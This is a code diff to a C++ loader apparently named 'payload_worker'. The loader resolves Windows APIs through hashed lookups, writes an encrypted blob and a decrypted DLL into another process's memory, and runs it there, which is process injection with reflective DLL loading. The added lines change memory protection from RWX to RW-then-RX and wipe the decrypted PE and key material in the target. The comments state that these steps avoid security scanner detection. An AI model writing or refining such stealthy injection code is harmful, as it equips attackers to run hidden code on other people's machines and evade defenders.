@@ -12,6 +12,7 @@ namespace payload_worker {
 // ---- Local kernel32 / ntdll / bcrypt API pointers ----
 using fn_VirtualAllocEx     = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 using fn_VirtualFreeEx      = BOOL  (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD);
+using fn_VirtualProtectEx   = BOOL  (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 using fn_WriteProcessMemory = BOOL  (WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
 using fn_ReadProcessMemory  = BOOL  (WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
 using fn_WaitForSingleObject= DWORD (WINAPI*)(HANDLE, DWORD);
@@ -31,6 +32,7 @@ struct resolved {
     // kernel32 (for the loader side):
     fn_VirtualAllocEx      vaex;
     fn_VirtualFreeEx       vfex;
+    fn_VirtualProtectEx    vpex;
     fn_WriteProcessMemory  wpm;
     fn_ReadProcessMemory   rpm;
     fn_WaitForSingleObject wait;
@@ -74,6 +76,7 @@ static bool resolve_all(resolved& r) {
     // Loader-side k32 helpers (used only here).
     r.vaex         = reinterpret_cast<fn_VirtualAllocEx>     (dynapi::resolve(k32, API_HASH("VirtualAllocEx")));
     r.vfex         = reinterpret_cast<fn_VirtualFreeEx>      (dynapi::resolve(k32, API_HASH("VirtualFreeEx")));
+    r.vpex         = reinterpret_cast<fn_VirtualProtectEx>   (dynapi::resolve(k32, API_HASH("VirtualProtectEx")));
     r.wpm          = reinterpret_cast<fn_WriteProcessMemory> (dynapi::resolve(k32, API_HASH("WriteProcessMemory")));
     r.rpm          = reinterpret_cast<fn_ReadProcessMemory>  (dynapi::resolve(k32, API_HASH("ReadProcessMemory")));
     r.wait         = reinterpret_cast<fn_WaitForSingleObject>(dynapi::resolve(k32, API_HASH("WaitForSingleObject")));
@@ -113,7 +116,7 @@ static bool resolve_all(resolved& r) {
     r.p_finish_hash   = dynapi::resolve(bcrypt, API_HASH("BCryptFinishHash"));
     r.p_destroy_hash  = dynapi::resolve(bcrypt, API_HASH("BCryptDestroyHash"));
 
-    return r.vaex && r.vfex && r.wpm && r.rpm && r.wait && r.close
+    return r.vaex && r.vfex && r.vpex && r.wpm && r.rpm && r.wait && r.close
         && r.gxt && r.find_res && r.load_res && r.lock_res && r.size_res
         && r.get_module_w && r.ncte
         && r.p_load_library_a && r.p_get_proc_address && r.p_virtual_alloc
@@ -194,8 +197,10 @@ outcome schedule(void*          hProc,
         r.vaex(hProc, nullptr, ct_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
     uint8_t* pt_remote     = static_cast<uint8_t*>(
         r.vaex(hProc, nullptr, ct_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    // Allocate the blob RW only; flip to RX after WriteProcessMemory. Keeps
+    // RWX pages out of the target (scanner red flag + attack surface).
     uint8_t* blob_remote   = static_cast<uint8_t*>(
-        r.vaex(hProc, nullptr, blob_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
+        r.vaex(hProc, nullptr, blob_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
     uint8_t* args_remote   = static_cast<uint8_t*>(
         r.vaex(hProc, nullptr, sizeof(sb_worker_args),
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
@@ -218,6 +223,12 @@ outcome schedule(void*          hProc,
     }
     if (!r.wpm(hProc, blob_remote, blob_ptr, blob_size, &written) || written != blob_size) {
         free_all(); o.res = result::write_failed; return o;
+    }
+    {
+        DWORD old_prot = 0;
+        if (!r.vpex(hProc, blob_remote, blob_size, PAGE_EXECUTE_READ, &old_prot)) {
+            free_all(); o.res = result::write_failed; return o;
+        }
     }
 
     // --- Build args locally --------------------------------------
@@ -318,14 +329,18 @@ outcome schedule(void*          hProc,
     o.dll_main_rc = fields[1];
     if (o.worker_rc != 0) { o.res = result::worker_failed; return o; }
 
-    // Zero the args / ciphertext regions in-target: the worker is done
-    // with them and keeping key material around invites a scanner hit.
+    // Zero the args / ciphertext / plaintext regions in-target: the worker
+    // is done with them and keeping key material (or the decrypted PE)
+    // around invites a scanner hit. sb_map_pe copies the DLL to a separate
+    // VirtualAlloc region (nt->ImageBase+delta); pt_remote is never read
+    // after the worker returns, so it is safe to wipe and release.
     {
         uint8_t zero[256] = {0};
         SIZE_T  wz = 0;
         for (SIZE_T off = 0; off < ct_len; off += sizeof(zero)) {
             SIZE_T chunk = (ct_len - off < sizeof(zero)) ? (ct_len - off) : sizeof(zero);
             r.wpm(hProc, ct_remote + off, zero, chunk, &wz);
+            r.wpm(hProc, pt_remote + off, zero, chunk, &wz);
         }
         for (SIZE_T off = 0; off < sizeof(sb_worker_args); off += sizeof(zero)) {
             SIZE_T chunk =
@@ -336,9 +351,11 @@ outcome schedule(void*          hProc,
     }
     r.vfex(hProc, ct_remote,   0, MEM_RELEASE);
     r.vfex(hProc, args_remote, 0, MEM_RELEASE);
-    // pt_remote and blob_remote stay: the mapped DLL (and any lingering
-    // worker code) references them until the host process exits.
-    (void)pt_remote;
+    r.vfex(hProc, pt_remote,   0, MEM_RELEASE);
+    // blob_remote stays: the worker thread has already returned, but the
+    // page is RX now (not RWX) and holds only code, no secrets. Releasing
+    // during an edge case where the thread is still winding down would be
+    // the only risk, so leave it to the process lifetime.
     (void)blob_remote;
 
     o.res = result::ok;
